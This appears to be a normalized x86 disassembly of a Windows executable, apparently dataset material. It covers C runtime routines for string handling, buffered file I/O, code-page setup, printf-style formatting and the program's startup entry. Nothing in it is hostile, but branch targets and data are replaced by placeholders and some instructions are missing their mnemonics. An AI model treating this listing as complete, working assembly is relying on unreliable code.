pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
sub_403660
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
call sub_404c63
push 0x8
mov [ ebp + 0xc ] eax
pop ecx
xor eax eax
lea edi [ ebp - 0x20 ]
push 0x7
[ edi ]
pop edi
mov dl [ esi ]
mov bl 0x1
movzx ecx dl
mov eax ecx
and ecx edi
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x20 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov al [ edx ]
push 0x1
movzx esi al
mov ecx esi
pop ebx
and ecx edi
shl ebx cl
shr esi 0x3
mov cl [ ebp + esi - 0x20 ]
test cl bl
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x18 ]
mov ebx edx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + 0x18 ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
and eax ebx
pop ebx
leave
retn
movzx esi al
mov ecx esi
push 0x1
and ecx edi
pop eax
shl eax cl
shr esi 0x3
mov cl [ ebp + esi - 0x20 ]
test cl al
jne r-xdata
inc edx
jmp r-xdata
and [ edx ] 0x0
inc edx
inc edx
jmp r-xdata
mov al [ edx ]
test al al
je r-xdata
sub_403710
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_403748
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
je r-xdata
push esi
call sub_404d86
push esi
call sub_403779
push esi
mov edi eax
call sub_404dd8
add esp 0xc
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
sub_403779
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x83
je r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
pop edi
pop esi
retn
push esi
call sub_404fda
push esi
mov edi eax
call sub_404f52
push [ esi + 0x10 ]
call sub_404e72
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_404e2a
and [ esi + 0x1c ] 0x0
pop ecx
sub_4037c5
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_404d86
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4037f4
push [ ebp + 0x14 ]
mov esi eax
call sub_404dd8
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_4037f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
test edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp + 0x8 ] ecx
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
jmp r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x10c
je r-xdata
cmp ecx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_4050e3
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
mov eax ecx
je r-xdata
cmp ecx eax
mov edi ecx
jb r-xdata
mov eax edi
xor edx edx
sub eax [ ebp + 0x8 ]
div [ ebp + 0xc ]
jmp r-xdata
mov [ ebx ] al
mov eax [ esi + 0x18 ]
inc ebx
dec [ ebp + 0x8 ]
mov [ ebp + 0x14 ] eax
push eax
push ebx
push [ esi + 0x10 ]
call sub_4051bf
add esp 0xc
test eax eax
je r-xdata
xor edx edx
div [ ebp + 0x14 ]
mov eax ecx
sub eax edx
push edi
push [ esi ]
push ebx
call sub_405400
sub [ ebp + 0x8 ] edi
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
add ebx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov edi eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ esi + 0xc ] 0x20
sub [ ebp + 0x8 ] eax
add ebx eax
jmp r-xdata
sub_4038dc
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_404d86
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_403908
push [ ebp + 0x8 ]
mov esi eax
call sub_404dd8
add esp 0x14
mov eax esi
pop esi
pop ebp
retn
sub_403908
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_4057a8
mov [ eax ] 0x16
or eax 0xffffffff
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
and al 0xef
cmp edi 0x1
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_404fda
mov eax [ esi + 0xc ]
pop ecx
test al 0x80
je r-xdata
push esi
call sub_4058b4
add [ esp + 0x14 ] eax
pop ecx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and al 0xfc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ esp + 0x14 ]
push [ esi + 0x10 ]
call sub_4057ba
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
jmp r-xdata
test al 0x8
je r-xdata
pop edi
pop esi
retn
test ah 0x4
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_403995
push esi
call sub_405b85
mov esi eax
test esi esi
jne r-xdata
push edi
push esi
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
call sub_405a15
push esi
mov edi eax
call sub_404dd8
add esp 0x14
mov eax edi
pop edi
pop esi
retn
pop esi
retn
sub_4039d9
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_404d86
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_403a08
push [ ebp + 0x14 ]
mov esi eax
call sub_404dd8
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_403a08
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_404201
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx eax
mov edi ebx
jb r-xdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push esi
call sub_404fda
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_405400
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_405c4d
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
push 0x1
call sub_406721
pop ecx
test eax eax
jne r-xdata
call sub_404bfc
test eax eax
jne r-xdata
push 0x1c
call sub_403c3f
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_406565
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_406433
mov [ rw-data ] eax
call sub_4061e6
call sub_40612d
call sub_405e3d
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_4060d5
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x10
call sub_403c3f
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_4011d0
mov [ ebp - 0x60 ] eax
push eax
call sub_405e6a
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_405f5d
pop ecx
pop ecx
retn
sub_403c8c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp [ eax * 4 + rw-data ] 0x0
lea esi [ eax * 4 + rw-data ]
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push edi
push 0x18
call sub_406abc
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0x11
call sub_403c8c
cmp [ esi ] 0x0
pop ecx
push edi
jne r-xdata
push 0x11
call sub_403c1a
pop ecx
call sub_404e2a
pop ecx
call [ InitializeCriticalSection@IAT ]
mov [ esi ] edi
jmp r-xdata
push 0x11
call sub_403ced
pop ecx
pop edi
sub_403d02
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x19
call sub_403c8c
push [ ebp + 0x8 ]
call sub_403eaf
mov ebx eax
pop ecx
cmp ebx [ rw-data ]
pop ecx
mov [ ebp + 0x8 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
xor esi esi
jmp r-xdata
call sub_403f2c
xor edx edx
mov eax rw-data
push 0x19
call sub_403ced
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push 0x40
pop ecx
xor eax eax
mov edi rw-data
lea esi [ edx + edx * 2 ]
[ edi ]
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jl r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
push 0x1
pop esi
cmp eax esi
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_403ef9
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x40
and [ rw-data ] 0x0
pop ecx
xor eax eax
mov edi rw-data
cmp [ ebp - 0x18 ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_403f55
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or esi 0xffffffff
and [ rw-data ] 0x0
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
mov eax esi
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push ebx
call sub_403ef9
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] esi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_403eaf
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_403ef9
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_403f2c
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_403f55
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_406d97
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_406b48
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_406b48
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_404100
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
[ rw-data ]
mov ebx ecx
push 0x13
call sub_403c8c
mov [ esp ] 0x1
mov ecx ebx
push 0x0
jmp r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
pop eax
or eax eax
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_406ee0
mov ebx eax
add esp 0x4
call sub_406ee0
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov ebx ecx
push 0x13
call sub_403ced
add esp 0x4
mov ecx ebx
[ rw-data ]
jmp r-xdata
neg ecx
dec ecx
jne r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_404201
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_405c4d
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_406fef
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_405c4d
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_406fab
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov ecx ebx
mov eax ebx
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_4057ba
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_404319
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp + 0xc ] edi
jne r-xdata
jmp [ eax * 4 + jump_table_404a3a ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x30 ]
xor edx edx
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] edx
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ esi + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x30 ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x20 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_404af8
test eax eax
pop ecx
mov [ ebp - 0x20 ] eax
jge r-xdata
lea eax [ ecx + ecx * 4 ]
movsx ecx bl
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_404af8
test eax eax
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
cmp [ edi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_404a5a
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_404a5a
mov bl [ edi ]
add esp 0xc
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x30 ] edx
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
lea edi [ ebp - 0x248 ]
cmp ecx edx
mov [ ebp - 0x8 ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc edi
inc edi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_404b05
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_404af8
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x44 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bl 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_404af8
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_404af8
pop ecx
xor edx edx
call sub_404af8
pop ecx
jmp r-xdata
call sub_404af8
pop ecx
movzx eax ax
jmp r-xdata
call sub_404af8
pop ecx
movsx eax ax
mov esi eax
mov edi edx
test edx edx
jg r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x2c ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x248 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
call sub_407020
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
call sub_404af8
pop ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0xc ] 0x1
call sub_404b15
push eax
lea eax [ ebp - 0x248 ]
push eax
call sub_40709b
add esp 0xc
mov [ ebp - 0xc ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x3 ] 0x8
mov [ ebp - 0x34 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_404af8
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0x8 ] ecx
